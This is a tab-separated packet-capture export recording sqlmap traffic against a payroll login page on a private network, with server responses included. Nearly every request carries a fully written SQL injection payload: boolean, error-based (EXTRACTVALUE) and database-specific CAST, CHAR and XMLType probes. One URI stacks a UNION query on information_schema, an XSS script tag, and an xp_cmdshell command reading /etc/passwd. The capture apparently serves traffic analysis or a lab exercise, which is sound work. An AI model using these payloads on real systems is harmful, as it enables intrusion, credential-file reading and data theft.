frame.number	ip.src	tcp.srcport	ip.dst	tcp.dstport	http.file_data	http.user_agent	http.request.full_uri
7	192.168.1.3	37828	192.168.2.2	80		sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
9	192.168.2.2	80	192.168.1.3	37828	\n<center>\n<form action="" method="post">\n<h2>Payroll Login</h2>\n<table style="border-radius: 25px; border: 2px solid black; padding: 20px;">\n    <tr>\n        <td>User</td>\n        <td><input type="text" name="user"></td>\n    </tr>\n    <tr>\n        <td>Password</td>\n        <td><input type="password" name="password"></td>\n    </tr>\n    <tr>\n       <td><input type="submit" value="OK" name="s">\n    </tr>\n</table>\n</form>\n</center>\n\n		
14	192.168.1.3	37826	192.168.2.2	80		sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
16	192.168.2.2	80	192.168.1.3	37826	\n<center>\n<form action="" method="post">\n<h2>Payroll Login</h2>\n<table style="border-radius: 25px; border: 2px solid black; padding: 20px;">\n    <tr>\n        <td>User</td>\n        <td><input type="text" name="user"></td>\n    </tr>\n    <tr>\n        <td>Password</td>\n        <td><input type="password" name="password"></td>\n    </tr>\n    <tr>\n       <td><input type="submit" value="OK" name="s">\n    </tr>\n</table>\n</form>\n</center>\n\n		
25	192.168.1.3	37830	192.168.2.2	80	user=EaKp&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
31	192.168.2.2	80	192.168.1.3	37830	\n\n<center><h2>Welcome, EaKp</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
37	192.168.1.3	37832	192.168.2.2	80	user=EaKp&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php?bebQ=8781%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23
40	192.168.2.2	80	192.168.1.3	37832	\n\n<center><h2>Welcome, EaKp</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
49	192.168.1.3	37834	192.168.2.2	80	user=EaKp&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
55	192.168.2.2	80	192.168.1.3	37834	\n\n<center><h2>Welcome, EaKp</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
61	192.168.1.3	37836	192.168.2.2	80	user=4390&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
64	192.168.2.2	80	192.168.1.3	37836	\n\n<center><h2>Welcome, 4390</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
73	192.168.1.3	37838	192.168.2.2	80	user=EaKp%29%27%29%28%29%29%28%28%29%22&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
79	192.168.2.2	80	192.168.1.3	37838	\n\n		
85	192.168.1.3	37840	192.168.2.2	80	user=EaKp%27WKPhaO%3C%27%22%3EgQhQlF&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
88	192.168.2.2	80	192.168.1.3	37840	\n\n		
97	192.168.1.3	37842	192.168.2.2	80	user=EaKp%27%29%20AND%203171%3D1899%20AND%20%28%27sKSS%27%3D%27sKSS&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
100	192.168.2.2	80	192.168.1.3	37842	\n\n		
109	192.168.1.3	37846	192.168.2.2	80	user=EaKp%27%29%20AND%203265%3D3265%20AND%20%28%27BjQQ%27%3D%27BjQQ&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
112	192.168.2.2	80	192.168.1.3	37846	\n\n		
124	192.168.1.3	37850	192.168.2.2	80	user=EaKp%27%20AND%203690%3D2575%20AND%20%27Vdvt%27%3D%27Vdvt&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
127	192.168.2.2	80	192.168.1.3	37850	\n\n<center><h2>Welcome, EaKp' AND 3690=2575 AND 'Vdvt'='Vdvt</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
133	192.168.1.3	37848	192.168.2.2	80	user=EaKp%27%20AND%203265%3D3265%20AND%20%27RNbq%27%3D%27RNbq&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
136	192.168.2.2	80	192.168.1.3	37848	\n\n<center><h2>Welcome, EaKp' AND 3265=3265 AND 'RNbq'='RNbq</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
145	192.168.1.3	37852	192.168.2.2	80	user=EaKp%29%20AND%207699%3D3429%20AND%20%288789%3D8789&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
148	192.168.2.2	80	192.168.1.3	37852	\n\n<center><h2>Welcome, EaKp) AND 7699=3429 AND (8789=8789</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
157	192.168.1.3	37854	192.168.2.2	80	user=EaKp%29%20AND%203265%3D3265%20AND%20%285615%3D5615&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
160	192.168.2.2	80	192.168.1.3	37854	\n\n<center><h2>Welcome, EaKp) AND 3265=3265 AND (5615=5615</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
169	192.168.1.3	37856	192.168.2.2	80	user=EaKp%20AND%201130%3D8646&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
172	192.168.2.2	80	192.168.1.3	37856	\n\n<center><h2>Welcome, EaKp AND 1130=8646</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
181	192.168.1.3	37858	192.168.2.2	80	user=EaKp%20AND%203265%3D3265&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
184	192.168.2.2	80	192.168.1.3	37858	\n\n<center><h2>Welcome, EaKp AND 3265=3265</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
193	192.168.1.3	37860	192.168.2.2	80	user=EaKp%20AND%205124%3D8720--%20zEbK&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
196	192.168.2.2	80	192.168.1.3	37860	\n\n<center><h2>Welcome, EaKp AND 5124=8720-- zEbK</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
205	192.168.1.3	37862	192.168.2.2	80	user=EaKp%20AND%203265%3D3265--%20qNWj&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
208	192.168.2.2	80	192.168.1.3	37862	\n\n<center><h2>Welcome, EaKp AND 3265=3265-- qNWj</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
220	192.168.1.3	37866	192.168.2.2	80	user=%28SELECT%20%28CASE%20WHEN%20%282967%3D9301%29%20THEN%20%27EaKp%27%20ELSE%20%28SELECT%209301%20UNION%20SELECT%203183%29%20END%29%29&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
223	192.168.2.2	80	192.168.1.3	37866	\n\n		
230	192.168.1.3	37864	192.168.2.2	80	user=%28SELECT%20%28CASE%20WHEN%20%281665%3D1665%29%20THEN%20%27EaKp%27%20ELSE%20%28SELECT%205092%20UNION%20SELECT%209965%29%20END%29%29&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
235	192.168.2.2	80	192.168.1.3	37864	\n\n		
241	192.168.1.3	37870	192.168.2.2	80	user=EaKp%27%29%20AND%20EXTRACTVALUE%287882%2CCONCAT%280x5c%2C0x716a626b71%2C%28SELECT%20%28ELT%287882%3D7882%2C1%29%29%29%2C0x7162787871%29%29%20AND%20%28%27swYk%27%3D%27swYk&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
247	192.168.2.2	80	192.168.1.3	37870	\n\n		
254	192.168.1.3	37872	192.168.2.2	80	user=EaKp%27%20AND%20EXTRACTVALUE%287882%2CCONCAT%280x5c%2C0x716a626b71%2C%28SELECT%20%28ELT%287882%3D7882%2C1%29%29%29%2C0x7162787871%29%29%20AND%20%27tzXE%27%3D%27tzXE&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
259	192.168.2.2	80	192.168.1.3	37872	\n\n		
266	192.168.1.3	37874	192.168.2.2	80	user=EaKp%29%20AND%20EXTRACTVALUE%287882%2CCONCAT%280x5c%2C0x716a626b71%2C%28SELECT%20%28ELT%287882%3D7882%2C1%29%29%29%2C0x7162787871%29%29%20AND%20%284270%3D4270&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
271	192.168.2.2	80	192.168.1.3	37874	\n\n<center><h2>Welcome, EaKp) AND EXTRACTVALUE(7882,CONCAT(0x5c,0x716a626b71,(SELECT (ELT(7882=7882,1))),0x7162787871)) AND (4270=4270</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
277	192.168.1.3	37878	192.168.2.2	80	user=EaKp%20AND%20EXTRACTVALUE%287882%2CCONCAT%280x5c%2C0x716a626b71%2C%28SELECT%20%28ELT%287882%3D7882%2C1%29%29%29%2C0x7162787871%29%29&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
280	192.168.2.2	80	192.168.1.3	37878	\n\n<center><h2>Welcome, EaKp AND EXTRACTVALUE(7882,CONCAT(0x5c,0x716a626b71,(SELECT (ELT(7882=7882,1))),0x7162787871))</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
289	192.168.1.3	37880	192.168.2.2	80	user=EaKp%20AND%20EXTRACTVALUE%287882%2CCONCAT%280x5c%2C0x716a626b71%2C%28SELECT%20%28ELT%287882%3D7882%2C1%29%29%29%2C0x7162787871%29%29--%20aTHR&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
295	192.168.2.2	80	192.168.1.3	37880	\n\n<center><h2>Welcome, EaKp AND EXTRACTVALUE(7882,CONCAT(0x5c,0x716a626b71,(SELECT (ELT(7882=7882,1))),0x7162787871))-- aTHR</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
301	192.168.1.3	37882	192.168.2.2	80	user=EaKp%27%29%20AND%203876%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283876%3D3876%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27Bocp%27%3D%27Bocp&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
305	192.168.2.2	80	192.168.1.3	37882	\n\n		
316	192.168.1.3	37888	192.168.2.2	80	user=EaKp%27%20AND%203876%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283876%3D3876%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27jFbe%27%3D%27jFbe&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
319	192.168.2.2	80	192.168.1.3	37888	\n\n		
325	192.168.1.3	37886	192.168.2.2	80	user=EaKp%29%20AND%203876%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283876%3D3876%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%285804%3D5804&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
328	192.168.2.2	80	192.168.1.3	37886	\n\n<center><h2>Welcome, EaKp) AND 3876=CAST((CHR(113)||CHR(106)||CHR(98)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (3876=3876) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(98)||CHR(120)||CHR(120)||CHR(113)) AS NUMERIC) AND (5804=5804</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
337	192.168.1.3	37890	192.168.2.2	80	user=EaKp%20AND%203876%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283876%3D3876%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
340	192.168.2.2	80	192.168.1.3	37890	\n\n<center><h2>Welcome, EaKp AND 3876=CAST((CHR(113)||CHR(106)||CHR(98)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (3876=3876) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(98)||CHR(120)||CHR(120)||CHR(113)) AS NUMERIC)</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
352	192.168.1.3	37894	192.168.2.2	80	user=EaKp%20AND%203876%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283876%3D3876%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20RKta&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
355	192.168.2.2	80	192.168.1.3	37894	\n\n<center><h2>Welcome, EaKp AND 3876=CAST((CHR(113)||CHR(106)||CHR(98)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (3876=3876) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(98)||CHR(120)||CHR(120)||CHR(113)) AS NUMERIC)-- RKta</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
361	192.168.1.3	37892	192.168.2.2	80	user=EaKp%27%29%20AND%204287%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284287%3D4287%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%20AND%20%28%27AKwc%27%3D%27AKwc&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
367	192.168.2.2	80	192.168.1.3	37892	\n\n		
373	192.168.1.3	37896	192.168.2.2	80	user=EaKp%27%20AND%204287%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284287%3D4287%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%20AND%20%27xFyc%27%3D%27xFyc&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
379	192.168.2.2	80	192.168.1.3	37896	\n\n<center><h2>Welcome, EaKp' AND 4287 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (4287=4287) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(120)+CHAR(120)+CHAR(113))) AND 'xFyc'='xFyc</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
385	192.168.1.3	37898	192.168.2.2	80	user=EaKp%29%20AND%204287%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284287%3D4287%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%20AND%20%281672%3D1672&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
388	192.168.2.2	80	192.168.1.3	37898	\n\n<center><h2>Welcome, EaKp) AND 4287 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (4287=4287) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(120)+CHAR(120)+CHAR(113))) AND (1672=1672</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
397	192.168.1.3	37900	192.168.2.2	80	user=EaKp%20AND%204287%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284287%3D4287%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
403	192.168.2.2	80	192.168.1.3	37900	\n\n<center><h2>Welcome, EaKp AND 4287 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (4287=4287) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(120)+CHAR(120)+CHAR(113)))</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
409	192.168.1.3	37902	192.168.2.2	80	user=EaKp%20AND%204287%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284287%3D4287%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29--%20vZUm&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
412	192.168.2.2	80	192.168.1.3	37902	\n\n<center><h2>Welcome, EaKp AND 4287 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (4287=4287) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(120)+CHAR(120)+CHAR(113)))-- vZUm</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
424	192.168.1.3	37906	192.168.2.2	80	user=EaKp%27%29%20AND%209408%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289408%3D9408%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27gOEi%27%3D%27gOEi&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
427	192.168.2.2	80	192.168.1.3	37906	\n\n		
434	192.168.1.3	37904	192.168.2.2	80	user=EaKp%27%20AND%209408%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289408%3D9408%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27gNsZ%27%3D%27gNsZ&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
439	192.168.2.2	80	192.168.1.3	37904	\n\n		
445	192.168.1.3	37908	192.168.2.2	80	user=EaKp%29%20AND%209408%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289408%3D9408%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%287537%3D7537&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
451	192.168.2.2	80	192.168.1.3	37908	\n\n<center><h2>Welcome, EaKp) AND 9408=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(106)||CHR(98)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (9408=9408) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(98)||CHR(120)||CHR(120)||CHR(113)||CHR(62))) FROM DUAL) AND (7537=7537</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
457	192.168.1.3	37910	192.168.2.2	80	user=EaKp%20AND%209408%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289408%3D9408%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
